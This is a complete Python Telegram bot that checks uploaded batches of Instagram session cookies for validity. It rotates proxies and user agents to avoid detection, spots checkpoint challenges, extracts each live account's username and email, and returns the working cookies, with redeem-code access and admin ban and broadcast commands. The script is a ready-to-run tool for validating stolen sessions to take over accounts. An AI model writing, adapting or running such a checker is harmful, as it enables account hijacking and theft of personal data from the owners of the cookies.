# Instagram Cookie Checker Telegram Bot (Single Script)
# Features: Account Info Extraction, Proxy Rotation, CAPTCHA Detection,
# Result File Delivery, /help, /ban, /unban, /broadcast

import os
import json
import random
import requests
from datetime import datetime
from telegram import Update, Document
from telegram.ext import (ApplicationBuilder, CommandHandler, MessageHandler,
                          ContextTypes, filters)
from bs4 import BeautifulSoup

# ===== CONFIG =====
ADMIN_ID = 7280950990
TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'
PROXY_LIST_FILE = 'proxies.txt'
VALID_OUTPUT_FILE = 'valid.txt'
REDEEM_CODES = {'FREECHECK': True}  # Code: status

# ===== IN-MEMORY STORE =====
authorized_users = set()
banned_users = set()

# ===== HELP MESSAGE =====
HELP_MSG = """
<b>Instagram Cookie Checker Bot</b>

<b>How to Use:</b>
1. Send your Instagram cookies in a .txt file (1 cookie per line).
2. Use /redeem &lt;code&gt; to unlock access.
3. Format: sessionid=abc; ds_user_id=xyz; csrftoken=xxx;

<i>After checking, valid cookies will be returned to you.</i>
"""

# ===== UTILITIES =====
def log(msg):
    with open('logs.txt', 'a') as f:
        f.write(f"[{datetime.now()}] {msg}\n")
    print(msg)

def get_random_proxy():
    if not os.path.exists(PROXY_LIST_FILE):
        return None
    with open(PROXY_LIST_FILE, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    if proxies:
        proxy = random.choice(proxies)
        return {
            "http": proxy,
            "https": proxy
        }
    return None

def parse_cookie(line):
    try:
        if line.strip().startswith("["):
            items = json.loads(line)
            return {i['name']: i['value'] for i in items}
        else:
            return dict(x.strip().split("=", 1) for x in line.strip().split(";") if "=" in x)
    except:
        return None

def check_instagram_cookie(cookie):
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        ]),
        "Referer": "https://www.instagram.com/",
    }
    proxy = get_random_proxy()
    try:
        res = requests.get("https://www.instagram.com/accounts/edit/",
                           headers=headers, cookies=cookie, proxies=proxy, timeout=10)

        if "checkpoint_required" in res.url or "challenge" in res.url:
            return False, "CAPTCHA / Checkpoint triggered"

        if res.status_code == 200 and "username" in res.text:
            soup = BeautifulSoup(res.text, "html.parser")
            username = soup.find("input", {"name": "username"})
            email = soup.find("input", {"name": "email"})
            return True, f"@{username['value']} | {email['value']}"
        return False, "Invalid/expired"
    except Exception as e:
        return False, f"Error: {e}"

# ===== TELEGRAM COMMANDS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_html("Welcome to the <b>Instagram Cookie Checker</b> bot!\nUse /help for instructions.")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_html(HELP_MSG)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if len(context.args) != 1:
        return await update.message.reply_text("Usage: /redeem &lt;code&gt;")
    code = context.args[0].strip()
    if REDEEM_CODES.get(code):
        authorized_users.add(user_id)
        REDEEM_CODES[code] = False
        await update.message.reply_text("✅ Access granted! Send your .txt file now.")
    else:
        await update.message.reply_text("❌ Invalid or expired code.")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in banned_users:
        return await update.message.reply_text("You are banned from using this bot.")
    if user_id not in authorized_users:
        return await update.message.reply_text("❌ You are not authorized. Use /redeem first.")

    file = await update.message.document.get_file()
    file_path = f"temp_{user_id}.txt"
    await file.download_to_drive(file_path)

    with open(file_path, "r") as f:
        lines = f.readlines()

    valid_lines = []
    for line in lines:
        cookie = parse_cookie(line)
        if not cookie:
            continue
        is_valid, msg = check_instagram_cookie(cookie)
        log(f"{user_id} | {msg}")
        if is_valid:
            valid_lines.append(line.strip())

    os.remove(file_path)

    if valid_lines:
        with open(VALID_OUTPUT_FILE, "w") as out:
            out.write("\n".join(valid_lines))
        await update.message.reply_document(Document.open(VALID_OUTPUT_FILE), filename="valid.txt")
    else:
        await update.message.reply_text("No valid cookies found.")

# ===== ADMIN ONLY =====
async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if context.args:
        banned_users.add(int(context.args[0]))
        await update.message.reply_text("User banned.")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if context.args:
        banned_users.discard(int(context.args[0]))
        await update.message.reply_text("User unbanned.")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    msg = " ".join(context.args)
    for uid in authorized_users:
        try:
            await context.bot.send_message(uid, f"[Broadcast]\n{msg}")
        except:
            pass
    await update.message.reply_text("Message sent to all users.")

# ===== MAIN =====
if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(MessageHandler(filters.Document.FILE_EXTENSION("txt"), handle_file))

    log("Bot started.")
    app.run_polling()
